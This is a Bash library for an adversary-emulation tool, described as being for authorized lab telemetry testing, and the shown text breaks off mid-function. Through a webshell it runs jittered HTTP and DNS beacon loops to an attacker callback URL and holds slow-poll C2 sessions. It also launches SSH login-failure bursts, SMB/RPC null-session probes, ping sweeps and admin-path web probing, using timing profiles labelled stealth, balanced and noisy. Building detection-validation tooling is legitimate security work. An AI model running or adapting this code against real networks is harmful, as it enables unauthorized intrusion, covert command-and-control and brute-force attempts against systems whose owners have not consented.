# ==============================================================================
# Stellar PoC — Human-like operator telemetry extensions (sourced library)
# Safe, authorized lab use only. No exploits, no credential theft, no destruction.
# @stellar-poc-version: 1.0.0
# ==============================================================================

# --- Humanize feature flags (defaults) ---
PERSISTENT_BEACON=false
BEACON_INTERVAL_SEC=20
JITTER_PERCENT=30
PIPELINE_OVERLAP=false
OVERLAP_EXECUTED=false
MAX_OVERLAP=2
TIMING_PROFILE="balanced"
SLOW_HTTP=false
SLOW_HTTP_SECONDS=120
NOISE_LEVEL="low"
PIPELINE_ACTIVE=false
WARMUP_MINUTES=0
BURST_MODE=false
BURST_SECONDS=45
OPERATOR_PHASE="active"
CURRENT_OVERLAP_GROUP=0
OVERLAP_GROUP_SEQ=0

HUMANIZE_PIDS=()
PIPELINE_OVERLAP_PIDS=()
PIPELINE_OVERLAP_STAGE_LABELS=()
PERSISTENT_BEACON_PIDS=()
NOISE_PIDS=()
SLOW_HTTP_PIDS=()
BURST_EVENTS=0
HUMANIZE_BEACON_HTTP_COUNT=0
HUMANIZE_BEACON_DNS_COUNT=0
SLOW_HTTP_SESSIONS=0
JITTER_SLEEP_TOTAL_SEC=0
ADAPTIVE_DECISION_COUNT=0

parse_humanize_cli_switches() {
    case "$1" in
        --persistent-beacon) PERSISTENT_BEACON=true; return 0 ;;
        --beacon-interval) BEACON_INTERVAL_SEC="${2:-}"; return 0 ;;
        --jitter-percent) JITTER_PERCENT="${2:-}"; return 0 ;;
        --overlap) PIPELINE_OVERLAP=true; return 0 ;;
        --max-overlap) MAX_OVERLAP="${2:-}"; return 0 ;;
        --timing-profile) TIMING_PROFILE="${2:-}"; return 0 ;;
        --slow-http) SLOW_HTTP=true; return 0 ;;
        --slow-http-seconds) SLOW_HTTP_SECONDS="${2:-}"; SLOW_HTTP=true; return 0 ;;
        --noise-level) NOISE_LEVEL="${2:-}"; return 0 ;;
        --warmup-minutes) WARMUP_MINUTES="${2:-}"; return 0 ;;
        --burst-mode) BURST_MODE=true; return 0 ;;
        --burst-seconds) BURST_SECONDS="${2:-}"; BURST_MODE=true; return 0 ;;
    esac
    return 1
}

humanize_usage_lines() {
    : # controlled by --intensity in stellar_poc.sh
}

validate_humanize_options() {
    if [[ -n "${BEACON_INTERVAL_SEC}" ]]; then
        _validate_positive_int "--beacon-interval" "${BEACON_INTERVAL_SEC}" 5 3600
    fi
    if [[ -n "${JITTER_PERCENT}" ]]; then
        _validate_positive_int "--jitter-percent" "${JITTER_PERCENT}" 0 100
    fi
    if [[ -n "${MAX_OVERLAP}" ]]; then
        _validate_positive_int "--max-overlap" "${MAX_OVERLAP}" 1 8
    fi
    [[ "${TIMING_PROFILE}" =~ ^(stealth|balanced|noisy)$ ]] || {
        log_message "ERROR" "--timing-profile must be stealth|balanced|noisy"
        exit 1
    }
    [[ "${NOISE_LEVEL}" =~ ^(low|medium|high)$ ]] || {
        log_message "ERROR" "--noise-level must be low|medium|high"
        exit 1
    }
    if [[ -n "${WARMUP_MINUTES}" && "${WARMUP_MINUTES}" != "0" ]]; then
        _validate_positive_int "--warmup-minutes" "${WARMUP_MINUTES}" 1 240
    fi
    if [[ -n "${SLOW_HTTP_SECONDS}" ]]; then
        _validate_positive_int "--slow-http-seconds" "${SLOW_HTTP_SECONDS}" 10 600
    fi
    if [[ -n "${BURST_SECONDS}" ]]; then
        _validate_positive_int "--burst-seconds" "${BURST_SECONDS}" 5 300
    fi
    if [[ "${PIPELINE_OVERLAP}" == true && -n "${SINGLE_STAGE}" ]]; then
        log_message "ERROR" "--overlap cannot be used with --single-stage"
        exit 1
    fi
}

apply_timing_profile_defaults() {
    case "${TIMING_PROFILE}" in
        stealth)
            CYCLE_SLEEP_MIN=6
            CYCLE_SLEEP_MAX=18
            ;;
        balanced)
            CYCLE_SLEEP_MIN=2
            CYCLE_SLEEP_MAX=9
            ;;
        noisy)
            CYCLE_SLEEP_MIN=1
            CYCLE_SLEEP_MAX=4
            ;;
    esac
}

operator_inter_stage_delay() {
    local base=4
    [[ "${DRY_RUN}" == true ]] && return 0
    case "${TIMING_PROFILE}" in
        stealth) base=7 ;;
        balanced) base=3 ;;
        noisy) base=1 ;;
    esac
    randomized_sleep "${base}" "${JITTER_PERCENT}"
}

randomized_sleep() {
    local base_sec="${1:-${BEACON_INTERVAL_SEC}}"
    local jitter_pct="${2:-${JITTER_PERCENT}}"
    local min_s max_s actual wait_s
    [[ "${DRY_RUN}" == true ]] && return 0
    pipeline_stop_requested && return 130
    min_s=$(awk -v b="${base_sec}" -v j="${jitter_pct}" 'BEGIN{printf "%.2f", b - (b*j/100)}')
    max_s=$(awk -v b="${base_sec}" -v j="${jitter_pct}" 'BEGIN{printf "%.2f", b + (b*j/100)}')
    actual=$(awk -v min="${min_s}" -v max="${max_s}" 'BEGIN{srand(); printf "%.2f", min + rand()*(max-min)}')
    wait_s=$(printf '%.0f' "${actual}" 2>/dev/null || echo 1)
  wait_s=$(safe_int "${wait_s}")
    JITTER_SLEEP_TOTAL_SEC=$(awk -v t="${JITTER_SLEEP_TOTAL_SEC}" -v a="${wait_s}" 'BEGIN{printf "%.0f", t+a}')
    interruptible_sleep "${wait_s}" || return 130
}

log_adaptive_decision() {
    local msg="$1"
    ADAPTIVE_DECISION_COUNT=$((ADAPTIVE_DECISION_COUNT + 1))
    state_append "adaptive_decisions.log" "cycle=${CURRENT_CYCLE:-1} | ${msg}"
    log_humanize_timeline "adaptive_decision" "${msg}"
    vlog "Adaptive: ${msg}"
}

log_humanize_timeline() {
    local event="$1" detail="$2" ts
    ts=$(date -u +"%Y-%m-%dT%H:%M:%SZ" 2>/dev/null || date -u +"%Y-%m-%dT%H:%M:%SZ")
    if [[ "${DRY_RUN}" == true ]]; then
        return 0
    fi
    if [[ -n "${TIMELINE_LOG}" ]]; then
        safe_append_file "${TIMELINE_LOG}" \
            "${ts} campaign=${CAMPAIGN_ID} cycle=${CURRENT_CYCLE:-1} phase=${OPERATOR_PHASE} overlap_group=${CURRENT_OVERLAP_GROUP:-0} event=${event} detail=\"${detail}\""
    fi
    state_append "humanize_events.log" "${ts} | ${event} | ${detail}"
}

count_remote_target_file() {
    local file="$1" cache n
    if [[ "${DRY_RUN}" == true ]]; then
        n=$(get_local_hosts "${file}" 2>/dev/null | extract_host_file_lines | safe_count_lines)
        safe_int "${n}"
        return 0
    fi
    [[ -z "${file}" ]] && { echo 0; return 0; }
    cache="${LOCAL_STATE_DIR}/remote_hosts/${file}"
    if [[ -s "${cache}" ]]; then
        count_discovered_ips_in_file "${cache}"
        return 0
    fi
    n=$(get_local_hosts "${file}" 2>/dev/null | awk '/^[0-9]+\./ {print $1}' | safe_count_lines)
    safe_int "${n}"
}

register_humanize_pid() {
    local pid="$1"
    [[ -n "${pid}" ]] && HUMANIZE_PIDS+=("${pid}")
}

humanize_flag_path() {
    printf '%s/.humanize_%s.active' "${LOCAL_STATE_DIR}" "$1"
}

http_beacon_loop() {
    local beacon_path="${CALLBACK_PREFIX}/check-in"
    local ua="TelemetryCollector/9.7"
    local attacker_host attacker_port
    attacker_host="${ATTACKER_BASE_URL#http://}"
    attacker_host="${attacker_host%%:*}"
    attacker_port="${ATTACKER_BASE_URL##*:}"
    while [[ -f "$(humanize_flag_path "persistent_beacon")" ]] && ! pipeline_stop_requested && [[ "${PIPELINE_ACTIVE}" != true ]]; do
        if [[ "${HAS_curl:-false}" == true ]]; then
            run_webshell "persistent-beacon-http" \
                "curl -s --max-time 3 -A $(printf '%q' "${ua}") -H 'X-PoC-Campaign: ${CAMPAIGN_ID}' -H 'X-Callback-Mode: persistent-low-slow' '${ATTACKER_BASE_URL}${beacon_path}?c=${CAMPAIGN_ID}&t='\$(date +%s) >/dev/null 2>&1 || true" \
                >/dev/null 2>&1 || true
        else
            run_webshell "persistent-beacon-http-raw" \
                "${REMOTE_SHELL_HELPERS} poc_http_send '${attacker_host}' '${attacker_port}' \"GET ${beacon_path}?c=${CAMPAIGN_ID} HTTP/1.1\\r\\nHost: ${attacker_host}\\r\\nUser-Agent: ${ua}\\r\\nConnection: close\\r\\n\\r\\n\" >/dev/null 2>&1 || true" \
                >/dev/null 2>&1 || true
        fi
        HUMANIZE_BEACON_HTTP_COUNT=$((HUMANIZE_BEACON_HTTP_COUNT + 1))
        log_humanize_timeline "persistent_beacon_http" "path=${beacon_path}"
        randomized_sleep "${BEACON_INTERVAL_SEC}" "${JITTER_PERCENT}"
    done
}

dns_beacon_loop() {
    local i q
    while [[ -f "$(humanize_flag_path "persistent_beacon")" ]] && ! pipeline_stop_requested && [[ "${PIPELINE_ACTIVE}" != true ]]; do
        q="$(build_remote_dns_random_query)"
        run_webshell "persistent-beacon-dns" \
            "for i in \$(seq_list 3); do dig +short ${q} >/dev/null 2>&1 || nslookup ${q} >/dev/null 2>&1 || true; sleep 1; done" \
            >/dev/null 2>&1 || true
        HUMANIZE_BEACON_DNS_COUNT=$((HUMANIZE_BEACON_DNS_COUNT + 1))
        log_humanize_timeline "persistent_beacon_dns" "query=entropy-dns"
        randomized_sleep "$((BEACON_INTERVAL_SEC + 5))" "${JITTER_PERCENT}"
    done
}

start_background_beacons() {
    local pid
    [[ "${PERSISTENT_BEACON}" != true ]] && return 0
    if [[ "${DRY_RUN}" == true ]]; then
        log_message "OK" "Persistent beacon planned (interval=${BEACON_INTERVAL_SEC}s jitter=${JITTER_PERCENT}%)"
        return 0
    fi
    : > "$(humanize_flag_path "persistent_beacon")" 2>/dev/null || true
    http_beacon_loop &
    pid=$!
    PERSISTENT_BEACON_PIDS+=("${pid}")
    register_humanize_pid "${pid}"
    dns_beacon_loop &
    pid=$!
    PERSISTENT_BEACON_PIDS+=("${pid}")
    register_humanize_pid "${pid}"
    log_message "OK" "Persistent background beacons started (HTTP+DNS loops)"
    log_humanize_timeline "persistent_beacon_start" "interval=${BEACON_INTERVAL_SEC}s"
}

stop_background_beacons() {
    local pid
    rm -f "$(humanize_flag_path "persistent_beacon")" 2>/dev/null || true
    for pid in "${PERSISTENT_BEACON_PIDS[@]}"; do
        [[ -z "${pid}" ]] && continue
        kill -TERM "${pid}" 2>/dev/null || true
    done
    interruptible_sleep 1 || true
    for pid in "${PERSISTENT_BEACON_PIDS[@]}"; do
        [[ -z "${pid}" ]] && continue
        kill -KILL "${pid}" 2>/dev/null || true
        wait "${pid}" 2>/dev/null || true
    done
    PERSISTENT_BEACON_PIDS=()
}

noise_traffic_loop() {
    local level="${NOISE_LEVEL}" count delay
    case "${level}" in
        low) count=3; delay=8 ;;
        medium) count=8; delay=4 ;;
        high) count=15; delay=2 ;;
    esac
    while [[ -f "$(humanize_flag_path "noise")" ]] && ! pipeline_stop_requested && [[ "${PIPELINE_ACTIVE}" != true ]]; do
        run_webshell "noise-traffic" \
            "${REMOTE_SHELL_HELPERS}
for n in \$(seq_list ${count}); do
  curl -s --max-time 2 http://127.0.0.1/robots.txt >/dev/null 2>&1 || true
  curl -s --max-time 2 http://127.0.0.1/favicon.ico >/dev/null 2>&1 || true
  curl -s --max-time 2 https://www.example.com/ >/dev/null 2>&1 || true
  getent hosts example.com >/dev/null 2>&1 || true
  sleep ${delay}
done" >/dev/null 2>&1 || true
        log_humanize_timeline "noise_traffic" "level=${level}"
        randomized_sleep "$((delay * 2))" "${JITTER_PERCENT}"
    done
}

start_noise_traffic() {
    local pid
    [[ "${NOISE_LEVEL}" =~ ^(low|medium|high)$ ]] || return 0
    if [[ "${DRY_RUN}" == true ]]; then
        log_message "OK" "Noise traffic planned (level=${NOISE_LEVEL})"
        return 0
    fi
    : > "$(humanize_flag_path "noise")" 2>/dev/null || true
    noise_traffic_loop &
    pid=$!
    NOISE_PIDS+=("${pid}")
    register_humanize_pid "${pid}"
    log_message "OK" "Background noise traffic started (${NOISE_LEVEL})"
}

stop_noise_traffic() {
    local pid
    rm -f "$(humanize_flag_path "noise")" 2>/dev/null || true
    for pid in "${NOISE_PIDS[@]}"; do
        [[ -z "${pid}" ]] && continue
        kill -TERM "${pid}" 2>/dev/null || true
    done
    interruptible_sleep 1 || true
    for pid in "${NOISE_PIDS[@]}"; do
        [[ -z "${pid}" ]] && continue
        kill -KILL "${pid}" 2>/dev/null || true
        wait "${pid}" 2>/dev/null || true
    done
    NOISE_PIDS=()
}

slow_http_session_loop() {
    local secs="${SLOW_HTTP_SECONDS}" attacker_host attacker_port
    attacker_host="${ATTACKER_IP}"
    attacker_port="${ATTACKER_PORT}"
    run_webshell "slow-http-session" \
        "${REMOTE_SHELL_HELPERS}
if command -v curl >/dev/null 2>&1; then
  curl -s --max-time ${secs} -H 'Connection: keep-alive' -H 'X-PoC-Campaign: ${CAMPAIGN_ID}' \
    '${ATTACKER_BASE_URL}${CALLBACK_PREFIX}/slowpoll?c=${CAMPAIGN_ID}' >/dev/null 2>&1 || true
else
  poc_http_send '${attacker_host}' '${attacker_port}' \"GET ${CALLBACK_PREFIX}/slowpoll HTTP/1.1\\r\\nHost: ${attacker_host}\\r\\nConnection: keep-alive\\r\\n\\r\\n\" >/dev/null 2>&1 || true
  sleep ${secs}
fi" >/dev/null 2>&1 || true
    SLOW_HTTP_SESSIONS=$((SLOW_HTTP_SESSIONS + 1))
    log_humanize_timeline "slow_http_complete" "seconds=${secs}"
}

start_slow_http_sessions() {
    local pid
    [[ "${SLOW_HTTP}" != true ]] && return 0
    if [[ "${DRY_RUN}" == true ]]; then
        log_message "OK" "Slow HTTP sessions planned (${SLOW_HTTP_SECONDS}s)"
        return 0
    fi
    slow_http_session_loop &
    pid=$!
    SLOW_HTTP_PIDS+=("${pid}")
    register_humanize_pid "${pid}"
    log_message "OK" "Slow HTTP session worker started"
}

stop_slow_http_sessions() {
    local pid
    for pid in "${SLOW_HTTP_PIDS[@]}"; do
        [[ -z "${pid}" ]] && continue
        kill -TERM "${pid}" 2>/dev/null || true
    done
    interruptible_sleep 1 || true
    for pid in "${SLOW_HTTP_PIDS[@]}"; do
        [[ -z "${pid}" ]] && continue
        kill -KILL "${pid}" 2>/dev/null || true
        wait "${pid}" 2>/dev/null || true
    done
    SLOW_HTTP_PIDS=()
}

stage_warmup_phase() {
    local end_epoch now mins="${WARMUP_MINUTES}"
    [[ "${WARMUP_MINUTES}" =~ ^[0-9]+$ ]] || return 0
    (( mins < 1 )) && return 0
    OPERATOR_PHASE="warmup"
    log_message "STAGE" "Warmup phase (${mins} minute(s)) — benign baseline traffic"
    log_humanize_timeline "warmup_start" "minutes=${mins}"
    if [[ "${DRY_RUN}" == true ]]; then
        add_executed_stage "Warmup Phase (simulated)"
        return 0
    fi
    end_epoch=$(($(date +%s) + mins * 60))
    while :; do
        pipeline_stop_requested && break
        now=$(date +%s)
        if (( now >= end_epoch )); then
            break
        fi
        run_webshell "warmup-beacon" \
            "curl -s --max-time 2 '${ATTACKER_BASE_URL}/' >/dev/null 2>&1 || true; curl -s --max-time 2 -I '${ATTACKER_BASE_URL}${CALLBACK_PREFIX}/health' >/dev/null 2>&1 || true" \
            >/dev/null 2>&1 || true
        run_webshell "warmup-dns" \
            "dig +short example.com >/dev/null 2>&1 || nslookup example.com >/dev/null 2>&1 || true" \
            >/dev/null 2>&1 || true
        run_webshell "warmup-recon" \
            "ping -c 1 -W 1 ${ATTACKER_IP} >/dev/null 2>&1 || true; ss -ant 2>/dev/null | head -n 5 >/dev/null || true" \
            >/dev/null 2>&1 || true
        write_report_entries "warmup" "T1595" "NDR" "Baseline Traffic" "lab" "Success" "warmup benign activity"
        randomized_sleep 12 "${JITTER_PERCENT}"
    done
    OPERATOR_PHASE="active"
    log_humanize_timeline "warmup_end" "transition=active"
    add_executed_stage "Warmup Phase"
}

stage_burst_activity() {
    local secs="${BURST_SECONDS}" i
    [[ "${BURST_MODE}" != true ]] && return 0
    OPERATOR_PHASE="burst"
    log_message "STAGE" "Burst mode (${secs}s) — rate-limited spike telemetry"
    log_humanize_timeline "burst_start" "seconds=${secs}"
    add_executed_stage "Burst Mode"
    if [[ "${DRY_RUN}" == true ]]; then
        BURST_EVENTS=5
        return 0
    fi
    for ((i = 0; i < secs && i < 60; i++)); do
        pipeline_stop_requested && break
        run_webshell "burst-dns" \
            "dig +short $(build_remote_dns_random_query) >/dev/null 2>&1 || true" \
            >/dev/null 2>&1 || true
        run_webshell "burst-http" \
            "curl -s --max-time 1 '${ATTACKER_BASE_URL}${CALLBACK_PREFIX}/burst?c=${CAMPAIGN_ID}&i=${i}' >/dev/null 2>&1 || true" \
            >/dev/null 2>&1 || true
        run_webshell "burst-smb-probe" \
            "${REMOTE_SHELL_HELPERS} poc_port_probe ${NETWORK_PREFIX}.10 445 || true; poc_port_probe ${NETWORK_PREFIX}.20 445 || true" \
            >/dev/null 2>&1 || true
        BURST_EVENTS=$((BURST_EVENTS + 1))
        interruptible_sleep 1 || break
    done
    OPERATOR_PHASE="active"
    log_humanize_timeline "burst_end" "events=${BURST_EVENTS}"
}

stage_adaptive_operator_followup() {
    local ssh_n http_n https_n smb_n target extra_ssh
    ssh_n=$(count_remote_target_file "ssh_hosts.txt")
    http_n=$(count_remote_target_file "http_targets.txt")
    https_n=$(count_remote_target_file "https_targets.txt")
    smb_n=$(count_remote_target_file "smb_hosts.txt")

    add_executed_stage "Adaptive Operator Logic"
    write_report_entries "adaptive_operator" "TA0007" "XDR/NDR" "Operator Decision" "discovered" "start" "service-weighted escalation"

    if (( ssh_n > 0 )); then
        extra_ssh=$((ssh_n * SSH_AUTH_FAILURE_TARGET / 2 + 10))
        SSH_FAIL_COUNT=$((SSH_FAIL_COUNT + extra_ssh))
        SSH_AUTH_FAILURE_TARGET=$((SSH_AUTH_FAILURE_TARGET + extra_ssh))
        log_adaptive_decision "SSH targets=${ssh_n}; increased SSH_FAIL_COUNT by ${extra_ssh}"
        if [[ "${DRY_RUN}" != true ]]; then
            target=$(get_local_hosts "ssh_hosts.txt" | head -n 1)
            if [[ -n "${target}" ]]; then
                run_webshell "adaptive-ssh-burst" \
                    "${REMOTE_SHELL_HELPERS} for i in \$(seq_list ${extra_ssh}); do ssh -o BatchMode=yes -o ConnectTimeout=2 -o StrictHostKeyChecking=no invaliduser@${target} exit </dev/null 2>&1 || true; sleep \$((1+RANDOM%3)); done" \
                    >/dev/null 2>&1 || true
            fi
        fi
    fi
    if (( http_n > 0 || https_n > 0 )); then
        HTTP_SCAN_REPEAT=$((HTTP_SCAN_REPEAT + http_n + https_n))
        HTTP_FOLLOWUP_REQUESTS=$((HTTP_FOLLOWUP_REQUESTS + http_n * 20))
        log_adaptive_decision "Web targets http=${http_n} https=${https_n}; HTTP_SCAN_REPEAT=${HTTP_SCAN_REPEAT}"
        if [[ "${DRY_RUN}" != true && "${HAS_curl:-false}" == true ]]; then
            target=$(get_local_hosts "http_targets.txt" | head -n 1)
            [[ -z "${target}" ]] && target=$(get_local_hosts "https_targets.txt" | head -n 1)
            if [[ -n "${target}" ]]; then
                run_webshell "adaptive-http-burst" \
                    "for p in / /api /login /admin /status; do curl -s --max-time 2 -A 'Mozilla/5.0' http://${target}\${p} >/dev/null 2>&1 || true; sleep \$((RANDOM%2)); done" \
                    >/dev/null 2>&1 || true
            fi
        fi
    fi
    if (( smb_n > 0 )); then
        log_adaptive_decision "SMB targets=${smb_n}; intensifying RPC/SMB probe slice"
        if [[ "${DRY_RUN}" != true ]]; then
            target=$(get_local_hosts "smb_hosts.txt" | head -n 1)
            if [[ -n "${target}" ]]; then
                run_webshell "adaptive-smb-burst" \
                    "smbclient //${target}/IPC\\\$ -N -c 'ls' >/dev/null 2>&1 || true; rpcclient -N -U '' '${target}' -c 'srvinfo' >/dev/null 2>&1 || true" \
                    >/dev/null 2>&1 || true
            fi
        fi
    fi
    if [[ "${HAS_dig:-false}" == true || "${HAS_nslookup:-false}" == true ]]; then
        DNS_QUERY_COUNT=$((DNS_QUERY_COUNT + 15 + smb_n))
        log_adaptive_decision "DNS tools available; DNS_QUERY_COUNT=${DNS_QUERY_COUNT}"
    fi
    if (( ssh_n == 0 && http_n == 0 && https_n == 0 && smb_n == 0 )); then
        log_adaptive_decision "Sparse discovery; operator pauses then widens ping sweep"
        if [[ "${DRY_RUN}" != true ]]; then
            run_webshell "adaptive-sparse-recon" \
                "for i in \$(seq_list 20); do ping -c 1 -W 1 ${NETWORK_PREFIX}.\$((RANDOM%254+1)) >/dev/null 2>&1 || true; done" \
                >/dev/null 2>&1 || true
        fi
    fi
    write_report_entries "adaptive_operator" "TA0007" "XDR/NDR" "Operator Decision" "discovered" "Success" "adaptive escalation applied"
}

reap_pipeline_overlap_pids() {
    local -a alive=() alive_labels=()
    local pid label idx
    for idx in "${!PIPELINE_OVERLAP_PIDS[@]}"; do
        pid="${PIPELINE_OVERLAP_PIDS[$idx]}"
        label="${PIPELINE_OVERLAP_STAGE_LABELS[$idx]:-unknown}"
        [[ -z "${pid}" ]] && continue
        if kill -0 "${pid}" 2>/dev/null; then
            alive+=("${pid}")
            alive_labels+=("${label}")
        else
            wait "${pid}" 2>/dev/null || true
        fi
    done
    PIPELINE_OVERLAP_PIDS=("${alive[@]}")
    PIPELINE_OVERLAP_STAGE_LABELS=("${alive_labels[@]}")
}

overlap_slot_wait_timeout_secs() {
    case "${POC_INTENSITY:-normal}" in
        high|spike) printf '600' ;;
        *) printf '300' ;;
    esac
}

overlap_worker_wait_timeout_secs() {
    case "${POC_INTENSITY:-normal}" in
        high|spike) printf '900' ;;
        *) printf '600' ;;
    esac
}

is_summary_critical_overlap_stage() {
    case "$1" in
        "Mandatory HTTP URL Burst"|"HTTP/HTTPS Follow-up"|"Enhanced DNS Tunnel"|"Mandatory DNS"|"ICMP Tunnel Simulation"|"Internal Web Fanout")
            return 0
            ;;
    esac
    return 1
}

is_overlap_kill_exempt_stage() {
    case "$1" in
        "Mandatory HTTP URL Burst")
            return 0
            ;;
    esac
    return 1
}

mark_overlap_worker_killed() {
    local label="$1" reason="$2"
    log_message "WARN" "Overlap worker terminated (${reason}): ${label}"
    set_stage_result "${label}" "Failed" "overlap worker killed (${reason})"
    mark_overlap_stage_result_timeout "${label}" "${reason}"
    state_append "overlap_timeline.log" "cycle=${CURRENT_CYCLE:-1} stage=${label} status=killed reason=${reason}"
}

wait_humanize_slot() {
    local max="${MAX_OVERLAP}" running waited=0 slot_timeout critical_wait=0
    slot_timeout=$(overlap_slot_wait_timeout_secs)
    [[ "${WEBSHELL_SLOW}" == true && "${max}" -gt 1 ]] && max=1
    while :; do
        pipeline_stop_requested && return 130
        reap_pipeline_overlap_pids
        running=${#PIPELINE_OVERLAP_PIDS[@]}
        (( running < max )) && break
        if (( waited >= slot_timeout )); then
            local victim_label="${PIPELINE_OVERLAP_STAGE_LABELS[0]:-unknown}"
            if is_overlap_kill_exempt_stage "${victim_label}" || is_summary_critical_overlap_stage "${victim_label}"; then
                critical_wait=$((critical_wait + 1))
                if (( critical_wait >= slot_timeout )); then
                    if ((${#PIPELINE_OVERLAP_PIDS[@]} > 0)); then
                        mark_overlap_worker_killed "${victim_label}" "summary-critical overlap slot timeout"
                        kill -TERM "${PIPELINE_OVERLAP_PIDS[0]}" 2>/dev/null || true
                        wait "${PIPELINE_OVERLAP_PIDS[0]}" 2>/dev/null || true
                        PIPELINE_OVERLAP_PIDS=("${PIPELINE_OVERLAP_PIDS[@]:1}")
                        PIPELINE_OVERLAP_STAGE_LABELS=("${PIPELINE_OVERLAP_STAGE_LABELS[@]:1}")
                    fi
                    waited=0
                    critical_wait=0
                else
                    log_message "WARN" "Overlap slot wait — preserving summary-critical stage: ${victim_label} (${critical_wait}/${slot_timeout}s)"
                fi
            else
                log_message "WARN" "Overlap slot wait timeout — terminating oldest overlap worker (${victim_label})"
                if ((${#PIPELINE_OVERLAP_PIDS[@]} > 0)); then
                    mark_overlap_worker_killed "${victim_label}" "overlap slot timeout"
                    kill -TERM "${PIPELINE_OVERLAP_PIDS[0]}" 2>/dev/null || true
                    wait "${PIPELINE_OVERLAP_PIDS[0]}" 2>/dev/null || true
                    PIPELINE_OVERLAP_PIDS=("${PIPELINE_OVERLAP_PIDS[@]:1}")
                    PIPELINE_OVERLAP_STAGE_LABELS=("${PIPELINE_OVERLAP_STAGE_LABELS[@]:1}")
                fi
                waited=0
            fi
        fi
        interruptible_sleep 1 || return 130
        waited=$((waited + 1))
    done
}

run_stage_concurrent() {
    local label="$1" fn_name="$2" pid
    OVERLAP_EXECUTED=true
    state_append "overlap_executed.flag" "true"
    OVERLAP_GROUP_SEQ=$((OVERLAP_GROUP_SEQ + 1))
    CURRENT_OVERLAP_GROUP="${OVERLAP_GROUP_SEQ}"
    wait_humanize_slot
    log_message "OK" "Overlap stage starting: ${label} (group=${CURRENT_OVERLAP_GROUP})"
    (
        CURRENT_OVERLAP_GROUP="${OVERLAP_GROUP_SEQ}"
        SSH_AUTH_BURST_ENABLED=true
        export SSH_AUTH_BURST_ENABLED LOCAL_STATE_DIR REMOTE_RUNTIME_DIR CAMPAIGN_ID TARGET_NET LOG_DIR EFFECTIVE_REPORT_DIR
        export HAS_dig HAS_nslookup HAS_host HAS_python3 HAS_curl HAS_ping HAS_bash HAS_ssh HAS_timeout
        export REMOTE_SHELL_BIN WEBSHELL_CMD_STYLE REMOTE_SHELL_HELPERS POC_INTENSITY DRY_RUN
        export WEB_SHELL_URL WEBSHELL_METHOD WEBSHELL_LOCK_FILE ATTACKER_IP ATTACKER_BASE_URL
        export REMOTE_PING_PATH CAMPAIGN_ID CURRENT_CYCLE
        log_humanize_timeline "overlap_stage_start" "label=${label} group=${CURRENT_OVERLAP_GROUP}"
        run_stage_safe "${label}" "${fn_name}"
        log_humanize_timeline "overlap_stage_end" "label=${label} group=${CURRENT_OVERLAP_GROUP}"
    ) &
    pid=$!
    PIPELINE_OVERLAP_PIDS+=("${pid}")
    PIPELINE_OVERLAP_STAGE_LABELS+=("${label}")
    state_append "overlap_timeline.log" "cycle=${CURRENT_CYCLE:-1} group=${CURRENT_OVERLAP_GROUP} stage=${label} pid=${pid}"
}

wait_all_humanize_workers() {
    local pid label idx start now timeout_s killed
    timeout_s=$(overlap_worker_wait_timeout_secs)
    for idx in "${!PIPELINE_OVERLAP_PIDS[@]}"; do
        pid="${PIPELINE_OVERLAP_PIDS[$idx]}"
        label="${PIPELINE_OVERLAP_STAGE_LABELS[$idx]:-unknown}"
        [[ -z "${pid}" ]] && continue
        pipeline_stop_requested && break
        if ! kill -0 "${pid}" 2>/dev/null; then
            wait "${pid}" 2>/dev/null || true
            continue
        fi
        log_message "OK" "Waiting for overlap worker pid=${pid} (${label})..."
        start=$(date +%s)
        killed=0
        while kill -0 "${pid}" 2>/dev/null; do
            pipeline_stop_requested && break
            now=$(date +%s)
            if (( now - start > timeout_s )); then
                mark_overlap_worker_killed "${label}" "worker wait timeout ${timeout_s}s"
                kill -TERM "${pid}" 2>/dev/null || true
                interruptible_sleep 1 || break
                kill -KILL "${pid}" 2>/dev/null || true
                killed=1
                break
            fi
            interruptible_sleep 1 || break
        done
        wait "${pid}" 2>/dev/null || true
        if (( killed == 0 )); then
            log_message "OK" "Overlap worker pid=${pid} (${label}) finished"
        fi
    done
    PIPELINE_OVERLAP_PIDS=()
    PIPELINE_OVERLAP_STAGE_LABELS=()
    CURRENT_OVERLAP_GROUP=0
    load_overlap_stage_results_from_state
}

pause_pipeline_background_workers() {
    PIPELINE_ACTIVE=true
    stop_background_beacons
    stop_noise_traffic
    stop_slow_http_sessions
}

resume_pipeline_background_workers() {
    PIPELINE_ACTIVE=false
    [[ "${DRY_RUN}" == true ]] && return 0
    start_background_beacons
    start_noise_traffic
    start_slow_http_sessions
}

stop_all_humanize_workers() {
    stop_background_beacons
    stop_noise_traffic
    stop_slow_http_sessions
    local pid
    for pid in "${PIPELINE_OVERLAP_PIDS[@]}"; do
        [[ -z "${pid}" ]] && continue
        kill -TERM "${pid}" 2>/dev/null || true
    done
    interruptible_sleep 1 || true
    for pid in "${PIPELINE_OVERLAP_PIDS[@]}"; do
        [[ -z "${pid}" ]] && continue
        kill -KILL "${pid}" 2>/dev/null || true
        wait "${pid}" 2>/dev/null || true
    done
    PIPELINE_OVERLAP_PIDS=()
    PIPELINE_OVERLAP_STAGE_LABELS=()
    wait_all_humanize_workers
    for pid in "${HUMANIZE_PIDS[@]}"; do
        [[ -z "${pid}" ]] && continue
        kill -TERM "${pid}" 2>/dev/null || true
    done
    interruptible_sleep 1 || true
    for pid in "${HUMANIZE_PIDS[@]}"; do
        [[ -z "${pid}" ]] && continue
        kill -KILL "${pid}" 2>/dev/null || true
        wait "${pid}" 2>/dev/null || true
    done
    HUMANIZE_PIDS=()
}

run_followup_stages_adaptive() {
    local include_windows="${1:-true}"
    local ancillary_only="${2:-false}"
    if [[ "${PIPELINE_OVERLAP}" == true ]]; then
        if [[ "${ancillary_only}" == true ]]; then
            log_message "OK" "Ancillary follow-ups (redis/elastic/mongo/windows) — core overlap already executed"
            run_pipeline_stage "Redis Follow-up" stage_redis_followup
            run_pipeline_stage "Elastic Follow-up" stage_elastic_followup
            run_pipeline_stage "Mongo Follow-up" stage_mongo_followup
            if [[ "${include_windows}" == true ]]; then
                run_pipeline_stage "Windows Telemetry" stage_windows_telemetry
            fi
            return 0
        fi
        log_message "OK" "Pipeline overlap enabled (max=${MAX_OVERLAP})"
        run_stage_concurrent "SSH Auth Burst" stage_ssh_auth_burst
        run_stage_concurrent "Redis Follow-up" stage_redis_followup
        run_stage_concurrent "Elastic Follow-up" stage_elastic_followup
        run_stage_concurrent "Mongo Follow-up" stage_mongo_followup
        run_stage_concurrent "HTTP/HTTPS Follow-up" stage_http_followup
        run_stage_concurrent "IDS/WAF Signature Probe" stage_ids_waf_signature_probe
        wait_all_humanize_workers
        if [[ "${include_windows}" == true ]]; then
            run_pipeline_stage "Windows Telemetry" stage_windows_telemetry
